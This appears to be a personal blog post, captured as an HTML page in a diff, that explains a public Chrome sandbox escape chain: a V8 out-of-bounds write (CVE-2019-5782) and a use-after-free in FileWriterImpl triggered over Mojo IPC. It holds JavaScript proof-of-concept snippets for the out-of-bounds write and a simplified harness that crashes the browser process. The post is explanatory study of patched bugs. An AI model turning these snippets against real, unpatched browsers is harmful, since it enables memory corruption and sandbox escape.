@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>My Take on Chrome Sandbox Escape Exploit Chain :: Adam Jordan&#39;s Blog — Things I am interested in</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Google&amp;rsquo;s Project Zero published a blog post explaining an exploit chain that bypass the Chrome browser sandbox. In this post, I will try to discuss my take on trying to understand the exploit chain. In summary, the sandbox bypass is made possible because of an Out-of-bound read and write bug in renderer process, chained with a Use-After-Free (UAF) bug in the browser processs, triggered via Mojo IPC connection.
+As disclaimer, this is not a bug that I find, nor that this is a full writeup about the exploit."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://blog.adamjordan.id/posts/006-chrome-sandbox-bypass/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://blog.adamjordan.id/assets/style.css">
+
+
+<link rel="stylesheet" href="https://blog.adamjordan.id/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://blog.adamjordan.id/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://blog.adamjordan.id/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="My Take on Chrome Sandbox Escape Exploit Chain"/>
+<meta name="twitter:description" content="Google&rsquo;s Project Zero published a blog post explaining an exploit chain that bypass the Chrome browser sandbox. In this post, I will try to discuss my take on trying to understand the exploit chain. In summary, the sandbox bypass is made possible because of an Out-of-bound read and write bug in renderer process, chained with a Use-After-Free (UAF) bug in the browser processs, triggered via Mojo IPC connection.
+As disclaimer, this is not a bug that I find, nor that this is a full writeup about the exploit."/>
+
+
+
+<meta property="og:title" content="My Take on Chrome Sandbox Escape Exploit Chain" />
+<meta property="og:description" content="Google&rsquo;s Project Zero published a blog post explaining an exploit chain that bypass the Chrome browser sandbox. In this post, I will try to discuss my take on trying to understand the exploit chain. In summary, the sandbox bypass is made possible because of an Out-of-bound read and write bug in renderer process, chained with a Use-After-Free (UAF) bug in the browser processs, triggered via Mojo IPC connection.
+As disclaimer, this is not a bug that I find, nor that this is a full writeup about the exploit." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.adamjordan.id/posts/006-chrome-sandbox-bypass/" />
+<meta property="article:published_time" content="2020-02-02T17:40:00+08:00" />
+<meta property="article:modified_time" content="2020-02-02T17:40:00+08:00" /><meta property="og:site_name" content="Adam Jordan&#39;s Blog" />
+
+
+
+
+
+
+  </head>
+  <body class="">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">Adam Jordan&#39;s Blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/security">Security</a></li>
+        
+      
+        
+          <li><a href="/archive">Archive</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/security">Security</a></li>
+      
+    
+      
+        <li><a href="/archive">Archive</a></li>
+      
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  <div class="post">
+    <h2 class="post-title"><a href="https://blog.adamjordan.id/posts/006-chrome-sandbox-bypass/">My Take on Chrome Sandbox Escape Exploit Chain</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            02-02-2020
+        </span>
+      
+      <span class="post-author">— Written by Adam Jordan</span>
+      
+        <span class="post-read-time">— 11 min read</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="https://blog.adamjordan.id/tags/security/">security</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+
+<p>Google&rsquo;s Project Zero published a <a href="https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html">blog post</a> explaining an exploit chain that bypass the Chrome browser sandbox.
+In this post, I will try to discuss my take on trying to understand the exploit chain.
+In summary, the sandbox bypass is made possible because of an <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5782">Out-of-bound read and write bug</a> in renderer process, chained with a <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1755">Use-After-Free (UAF) bug</a> in the browser processs, triggered via Mojo IPC connection.</p>
+
+<p>As disclaimer, this is <strong>not</strong> a bug that I find, <strong>nor</strong> that this is a full writeup about the exploit.
+I made this post to help me organize my thought in trying to understand the bug and the exploit.</p>
+
+<h2 id="security-architecture-in-chromium">Security Architecture in Chromium</h2>
+
+<p>Google Chrome is based on Chromium, an open-source browser that is also forked into several other popular browsers, e.g. Opera, and Microsoft Edge.</p>
+
+
+  <figure class="center" >
+    <img src="/post_assets/006/architecture_processes.png"   style="width: 100%; max-width: 500px;"  />
+    
+      <figcaption class="center" >Chromium separated processes</figcaption>
+    
+  </figure>
+
+
+
+<p>Chromium&rsquo;s architecture allocates the components into separated process between the browser kernel process and the rendering engine process.
+We can roughly say that the renderer process represent the <em>Tab</em> (though one renderer process can manage multiple tabs in some cases), while the browser process represent the <em>Browser</em> itself.
+So, in a chrome instance, there are 1 Browser Process and several Renderer Process.</p>
+
+
+  <figure class="center" >
+    <img src="/post_assets/006/architecture_ui.png"   style="width: 100%; max-width: 600px;"  />
+    
+      <figcaption class="center" >UI Representation with Chromium processes</figcaption>
+    
+  </figure>
+
+
+
+<p>Also because of this architecture, if a web page is misbehaving and causes a process to crash, this will not crash the whole browser.
+Instead, it will only crash the specific tab opening the page.</p>
+
+
+  <figure class="center" >
+    <img src="/post_assets/006/architecture_crash.png"   style="width: 100%; max-width: 600px;"  />
+    
+      <figcaption class="center" >Tab crash does not affect browser</figcaption>
+    
+  </figure>
+
+
+
+<p>The renderer process is responsible for operations that need fast performance, such as HTML and CSS parsing, Javascript interpreter, Regex, DOM, etc.
+While these operations are fast, most of browser vulnerabilities found are related to these actions.
+On the other side, the browser process is responsible for more sensitive operations, such as cookie database, network management, window management, etc.</p>
+
+<p>According to this paper <a href="https://seclab.stanford.edu/websec/chromium/chromium-security-architecture.pdf"><em>The Security Architecture of the Chromium Browser</em></a>, the operations in renderer process contributes around 75% of the vulnerabilities (disclaimer: I&rsquo;m doing rough unreliable non-academic estimate).
+So, the chance to compromise the renderer process is higher than compromising the browser process, which lead to a solution of <strong>sandboxing</strong> the renderer process.</p>
+
+
+  <figure class="center" >
+    <img src="/post_assets/006/architecture_vulns.png"   style="width: 100%; max-width: 500px;"  />
+    
+  </figure>
+
+
+
+<p>By running the renderer process in a sandbox with restricted privilege, we can mitigate high-severity attacks, such as preventing compromised renderer process to read / write to filesystem.
+Sandboxing force the renderer process to communicate with browser process API to interact with the outside world.
+The goal of the sandbox is to require even a compromised renderer process to use browser process interface to interact with the system.
+This communication between renderer processes and browser process is using <a href="https://chromium.googlesource.com/chromium/src.git/+/master/mojo/README.md">Mojo IPC</a>, an open source IPC library.</p>
+
+<p><img src="/post_assets/006/architecture_mojo.png" alt="Architecture UI" /></p>
+
+<p>One way that allow us to easily interact with Mojo is by activating the MojoJS Binding feature in Chromium.
+We can activate the feature by running the browser with flag <code>--enable-blink-features=MojoJS</code>.
+If this feature is activated, the browser will expose a <code>Mojo</code> javascript object that allows us to interact and override Mojo interfaces.</p>
+
+<h2 id="out-of-bound-read-write-in-renderer-process">Out-of-Bound Read/Write in Renderer Process</h2>
+
+<p>There is an out-of-bound memory access bug in renderer process discovered by @S0rryMybad (CVE-2019-5782).
+The bug resulted from incorrectly estimating the possible range of <code>arguments.length</code>.
+The JS optimizer incorrecly assumes that the maximum length of arguments is <code>65534</code>, while actually the it can be larger.
+From this wrong estimation, optimizer evaluate that <code>arguments.length &gt;&gt; 16</code> will always be <code>0</code> (which is incorrect).</p>
+
+<p>We can leverage this to trigger BCE (Bounds-Check-Elimination) optimisation in JS compiler.
+In JS, Bounds checking is done when we are accessing or writing arrays.
+For example, if when we try to write index <code>3</code> of an array with length <code>1</code>, the bound checking will be done and no operation will be done. In the example below, it will output expected result <code>['y']</code></p>
+
+<pre><code class="language-js">function fun(arg) {
+	let x = new Array('x')
+	let y = new Array('y')
+	x[3] = 'ehe'
+	return y
+}
+
+args = []
+console.log(fun(...args)) // output: ['y']
+</code></pre>
+
+<p>Now, let&rsquo;s see what we can do with the false estimation by JS optimizer.</p>
+
+<ul>
+<li>Optimizer assumes that <code>arguments.length &gt;&gt; 16</code> is always <code>0</code>.</li>
+<li>For <code>x</code> our arguments length, we can define <code>x = 65537</code>, so <code>x &gt;&gt; 16</code> is actually <code>1</code>.</li>
+<li>Now, for any number <code>i</code>, we know that <code>(x &gt;&gt; 16) * i == i</code>. Meanwhile, optimizer assumes that <code>((x &gt;&gt; 16) * i)</code> will evaluate to <code>(0 * i)</code> which is always <code>0</code>.</li>
+<li>If we access an array with <code>arr[(x &gt;&gt; 16) * i]</code>, optimizer will assume that it will always evaluate to accessing index <code>0</code>, hence bounds-checking is not needed. Though in reality, it actually evaluate to accessing index <code>i</code>.</li>
+</ul>
+
+<p>For example:</p>
+
+<pre><code class="language-js">function fun(arg) {
+	let x = new Array('x')
+	let y = new Array('y')
+	x[(arguments.length &gt;&gt; 16) * 3] = 'ehe'
+	return y
+}
+
+args = []
+args.length = 65537
+console.log(fun(...args)) // output: ??
+</code></pre>
+
+<p>You may notice that if you run that JS code in a javascript console (e.g. Chrome dev console), it will still output <code>['y']</code>. Does this means that our exploit does not work? This is related to JIT paradigm in Chrome.</p>
+
+<p>Chrome is using V8 Javascript Engine which implementing <strong>JIT (Just-in-Time)</strong> paradigm, which combines the use of interpreter and compiler for executing code.</p>
+
+<p>Basically, a code will be executed with <strong>interpreter (<em>Ignition</em>)</strong> by default, and V8 will keep track of how many times the code segments are executed.
+If the code segments are executed many times (hot code segments), the code segments will be compiled with a <strong>compiler (<em>TurboFan</em>)</strong>.
+In this compilation, optimizations will be applied, thus producing a faster execution time.</p>
+
+
+  <figure class="center" >
+    <img src="/post_assets/006/oob_jit.png"   style="width: 100%; max-width: 700px;"  />
+    
+  </figure>
+
+
+
+<p>Therefore, to make the optimizer remove the bounds-checking, we may need to run the function a lot of times before,
+thus triggering the JS engine to compile and optimize our <code>fun</code> function, eliminating the bounds checking.</p>
+
+<pre><code class="language-js">function fun(arg) {
+	let x = new Array('x')
+	let y = new Array('y')
+	x[(arguments.length &gt;&gt; 16) * 3] = 'ehe'
+	return y
+}
+
+for (let i = 0; i &lt; 10000; i++) fun(1) // trigger optimization
+
+args = []
+args.length = 65537
+console.log(fun(...args)) // output: [&quot;ehe&quot;]
+</code></pre>
+
+<p>Now, we can see from the output of the above code that we are able to write memory outside array <em>x</em>.</p>
+
+<p><img src="/post_assets/006/oob_output.png" alt="Out-of-Bound screenshots" /></p>
+
+<h2 id="use-after-free-in-browser-process-filewriterimpl">Use-After-Free in Browser Process FileWriterImpl</h2>
+
+<p>There is a UAF in the implementation of Mojo Binding&rsquo;s FileWriter component, specifically at FileWriterImpl implementation. Read <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1755">Issue 1755 bugtracker</a>.</p>
+
+<pre><code class="language-c">// simplified
+void FileWriterImpl::Write(position, blob, callback) {
+  blob_context_-&gt;GetBlobDataFromBlobPtr(
+      std::move(blob),
+      base::BindOnce(&amp;FileWriterImpl::DoWrite, base::Unretained(this), std::move(callback), position));
+}
+</code></pre>
+
+<p>As disclaimer, the code above is heavily simplified for explanation purpose.
+Bsically, when we are calling <code>Write</code> function to write a blob data, the browser process will retrieve the BlobData using asynchronous function, and provide a callback to it.
+In the provided callback, FileWriterImpl is providing a reference to <code>this</code> or the FileWriterImpl instance itself with <code>base:Unretained()</code>.
+The <code>base::Unretained(this)</code> creates an unchecked reference of the <code>FileWriterImpl</code> instance.
+This could be dangerous if the <code>FileWriterImpl</code> instance is already freed when the callback is called, as it will continue its execution while refering to a stale pointer that refer to an already freed object.</p>
+
+<p>Now, we are going to look for how to trigger the <code>free</code> of the unretained reference.</p>
+
+<pre><code class="language-c">// simplified
+void BlobStorageContext::GetBlobDataFromBlobPtr(blob, callback) {
+  raw_blob = blob.get();
+  raw_blob-&gt;GetInternalUUID([](uuid) {
+  		std::move(callback).Run(context-&gt;GetBlobDataFromUUID(uuid));
+  	})
+}
+</code></pre>
+
+<p>We see that in <code>GetBlobDataFromBlobPtr()</code>, it will call an asynchronous function <code>GetInternalUUID</code> to get the blob UUID, then call our provided callback.
+Fortunately (or unfortunately?), the <code>GetInternalUUID</code> is a mojo interface method.
+This means that renderer can define the implementation of <code>GetInternalUUID</code> if it passes a renderer-hosted Blob implementation instead of browser-process-hosted blob.</p>
+
+<p>In short, what it implies is: If we (attacker) is able to control the renderer process, we can define the implementation of <code>GetInternalUUID</code>.</p>
+
+<p>In our implementation of <code>GetInternalUUID</code>, we can destroy the renderer handle to FileWriter.
+This will trigger immediate destruction (free) of FileWriterImpl.
+Thus, when <code>GetInternalUUID</code> returns, it will call the callback while using the provided <code>base::Unretained(*FileWriterImpl)</code>, which is a stale pointer of an already freed object.
+Normally this will cause the browser process to crash.</p>
+
+<pre><code class="language-js">BlobImpl.prototype = {
+    getInternalUUID: async (arg0) =&gt; {
+        writer.writer.ptr.reset(); // destroy the renderer handle of FileWriter
+        return {'uuid': &quot;blob_0&quot;};
+    }
+}
+</code></pre>
+
+<p><img src="/post_assets/006/uaf_diagram.png" alt="UAF in FileWriterImpl" /></p>
+
+<p>Note that destroying the FileWriter handle in renderer process will trigger the destruction of FileWriterImpl in browser process because FileWriterImpl is created and bound with <code>mojo::StrongBinding</code>.</p>
+
+<pre><code class="language-c">// simplified
+void FileSystemManagerImpl::CreateWriter(const GURL&amp; file_path,
+                                        CreateWriterCallback callback) {
+ ...
+ blink::mojom::FileWriterPtr writer;
+ mojo::MakeStrongBinding(std::make_unique&lt;storage::FileWriterImpl&gt;(
+                             url, context_-&gt;CreateFileSystemOperationRunner(),
+                             blob_storage_context_-&gt;context()-&gt;AsWeakPtr()),
+                         MakeRequest(&amp;writer));
+ std::move(callback).Run(base::File::FILE_OK, std::move(writer));
+}
+</code></pre>
+
+<p>You may have noticed that this bug cannot be exploited directly in a real world scenario of a normal Chrome user.
+This is because we need access to communicate with the Mojo interface from Javascript.
+In a default instance of Chrome browser, the Mojo interface is not exposed and cannot be used by javascript in a webpage.</p>
+
+<h2 id="the-sandbox-bypass">The Sandbox Bypass</h2>
+
+<p>Let&rsquo;s limit our goal, we just want to crash the Chrome browser of a normal user running default Chrome instance.</p>
+
+<p>The idea is as follows:</p>
+
+<ul>
+<li>Victim visit our specially crafted HTML page</li>
+<li>With CVE-2019-5782, we setup Out-of-Bound Read/Write in Renderer Process (discussed in previous section)</li>
+<li>With OoB read/write, we enable MojoJS Binding in browser (discussed later)</li>
+<li>With MojoJS Binding now enabled and exposed to JS context, the page can communicate with Mojo IPC interface directly.</li>
+<li>Execute the UAF exploit to free FileWriterImpl (discussed in previous section), virtually bypassing sandbox and crashing the Browser Process.</li>
+</ul>
+
+<p><img src="/post_assets/006/sandbox_idea.gif" alt="Out-of-Bound screenshots" /></p>
+
+<h3 id="enabling-mojojs-binding">Enabling MojoJS Binding</h3>
+
+<p>We know that with UAF discovered in <em>Issue 1755</em>, we can crash the browser.
+But, we need to have MojoJS binding enabled, and it is definitely not <em>cool</em> to ask our target to enable the MojoJS flag when running their Chrome browser.
+Instead, we are going to exploit the Out-of-Bound memory access bug to enable the Mojo Binding.</p>
+
+<p>Inside the Chrome source code, we can see that MojoJS feature is added to Javascript context in <code>RenderFrameImpl::DidCreateScriptContext</code>.</p>
+
+<pre><code class="language-c">void RenderFrameImpl::DidCreateScriptContext(v8::Local&lt;v8::Context&gt; context,
+                                             int world_id) {
+  if ((enabled_bindings_ &amp; BINDINGS_POLICY_MOJO_WEB_UI) &amp;&amp; IsMainFrame() &amp;&amp;
+      world_id == ISOLATED_WORLD_ID_GLOBAL) {
+    blink::WebContextFeatures::EnableMojoJS(context, true);
+  }
+  ...
+}
+</code></pre>
+
+<p>In the function, MojoJS is enabled if <code>(enabled_bindings_ &amp; BINDINGS_POLICY_MOJO_WEB_UI)</code> is true).
+By using OoB memory access bug, we can write and set the <code>enabled_bindings_</code> variable <code>BINDINGS_POLICY_MOJO_WEB_UI</code> value. Then, we can reload the page so <code>Mojo</code> in our javascript context.</p>
+
+<h3 id="sandbox-escape-and-crashing-the-browser">Sandbox Escape and Crashing the Browser</h3>
+
+<p>Not that we have MojoJS binding enabled, we can use the exploit for UAF bug in Issue 1755.
+The steps are as follows:</p>
+
+<ul>
+<li>A user visit our specially crafted HTML page.</li>
+<li>With CVE-2019-5782, we set <code>enabled_bindings_</code> value accordingly to enable MojoJS binding.
+Then reload the page.</li>
+<li>With Mojo now exposed to JS context, the page can communicate with Mojo IPC interface directly.</li>
+<li>Execute the UAF exploit to free FileWriterImpl.</li>
+</ul>
+
+<p>When the browser process use the stale pointer inside the unretained FileWriterImpl reference, the browser will crash.</p>
+
+<p>We are reusing some of the code in the attached exploit at <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1755">Issue 1755 bug tracking</a>.
+The simplified code is as follows:</p>
+
+<pre><code class="language-html">&lt;!-- index.html --&gt;
+
+&lt;script src=&quot;/many_args.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;/enable_mojo.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;/crash.js&quot;&gt;&lt;/script&gt;
+
+&lt;script&gt;
+  let oob = new many_args(); // setup OOB read/write
+  if (typeof(Mojo) !== &quot;undefined&quot;) {
+    print('[enable_mojo] mojo already enabled')
+    crash(oob);
+  } else {
+    enable_mojo(oob);
+  }
+&lt;/script&gt;
+</code></pre>
+
+<pre><code class="language-js">// crash.js
+
+async function CreateWriter() {
+  // create writer from blink.mojom.FileSystemManagerPtr ...
+}
+
+async function Blob0() {
+  // register blob_0 to blob registry ...
+}
+
+async function crash(oob) {
+  print('[sandbox_escape] exploiting issue_1755 to escape sandbox and crash browser');
+
+  var writer = await CreateWriter()
+
+  print('  [*] crafting renderer-hosted blob implementation')
+  function Blob0Impl() {
+    this.binding = new mojo.Binding(blink.mojom.Blob, this);
+  }
+  Blob0Impl.prototype = {
+    getInternalUUID: async (arg0) =&gt; {
+      print('  [*] getInternalUUID is called');
+
+      print('  [!] freeing FileWriterImpl');
+      create_writer_result.writer.ptr.reset();
+
+      // sleep 3 seconds ...
+
+      print('  [*] resuming FileWriterImpl::DoWrite, prepare to crash');
+      return {'uuid': 'blob_0'};
+    }
+  };
+
+  Blob0();
+
+  let blob_impl = new Blob0Impl();
+  let blob_impl_ptr = new blink.mojom.BlobPtr();
+  blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));
+
+  print('  [*] calling Write with renderer-hosted blob implementation')
+  writer.writer.write(0, blob_impl_ptr);
+}
+</code></pre>
+
+<p>In <code>index.html</code>, we are setting up Out-of-Bound read/write bug by exploiting CVE-2019-5782.
+Then, at first we visit the page, we enable the Mojo binding, and reload the page.
+Now that the Mojo binding is enabled (not undefined), we call the <code>crash</code> function.</p>
+
+<p>In <code>crash</code> function, we are registering a blob with id <code>blob_0</code> to blob registry,
+then we define our custom Blob implementation with a malicious implemenation of <code>getInternalUUID</code>.
+Finally we call the <code>Write</code> function with a custom renderer-hosted blob implementation.</p>
+
+<p>Inside our custom <code>getInternalUUID</code>, we free the <code>FileWriterImpl</code> instance.
+When the function return and the execution is passed to <code>DoWrite</code>, the freed / stale pointer will be used, causing the browser to crash.</p>
+
+<h2 id="sandbox-escape-demo">Sandbox Escape Demo</h2>
+
+<p><img src="/post_assets/006/sandbox_escape.gif" alt="Sandbox escape demo" /></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Please note that this is not a writeup of an exploit.
+In this post, I discussed about the general idea how to escape the sandbox in Chromium-based browser, in this case Google Chrome.
+The idea presented in this post can still be leveraged to increase the damage, e.g. executing system call to execute a program (e.g. popup calculator).
+As I first mentioned, this post acts to help me organize my thought while trying to understand the exploit chain posted in Project Zero blog.
+Therefore, I recommend reading <a href="googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html">their post</a>.</p>
+
+<h2 id="references">References</h2>
+
+<ul>
+<li><a href="https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html">Google Project Zero - Virtually Unlimited Memory: Escaping the Chrome Sandbox</a></li>
+<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1755">Chromium bug tracker - issue 1755</a></li>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5782">Cvemitre - CVE-2019-5782</a></li>
+<li><a href="https://www.chromium.org/developers/how-tos/get-the-code">Chromium docs - Getting chromium source code</a></li>
+<li><a href="http://dev.chromium.org/developers/design-documents/multi-process-architecture">Chromium design document - Multi process architecture</a></li>
+<li><a href="https://docs.google.com/document/d/1aitSOucL0VHZa9Z2vbRJSyAIsAz24kX8LFByQ5xQnUg/edit">Chromium design document - How Blink works</a></li>
+<li><a href="https://github.com/vngkv123/aSiagaming/tree/master/Chrome-v8-906043">CVE-2019-5782 exploit PoC</a></li>
+<li><a href="https://chromium.googlesource.com/chromium/src.git/+/master/mojo/README.md">Chromium repo - Mojo IPC docs</a></li>
+<li><a href="https://seclab.stanford.edu/websec/chromium/">Stanford paper - The Security Architecture of the Chromium Browser</a></li>
+</ul>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="https://blog.adamjordan.id/posts/005-hunterai-topdown-shooter-ai/">
+                  <span class="button__text">HunterAI #3: Top-down Shooter AI</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+    
+
+    
+      
+        
+    <br><br>
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "adam-blog" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+      
+    
+    
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">Adam Jordan&#39;s Blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://blog.adamjordan.id/assets/main.js"></script>
+<script src="https://blog.adamjordan.id/assets/prism.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [['$','$'], ['\\(','\\)']],
+        displayMath: [['$$','$$'], ['\[','\]']],
+        processEscapes: true,
+        processEnvironments: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+        TeX: { equationNumbers: { autoNumber: "AMS" },
+            extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    }
+});
+</script>
+
+
+      
+    </div>
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124774114-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+  </body>
+</html>
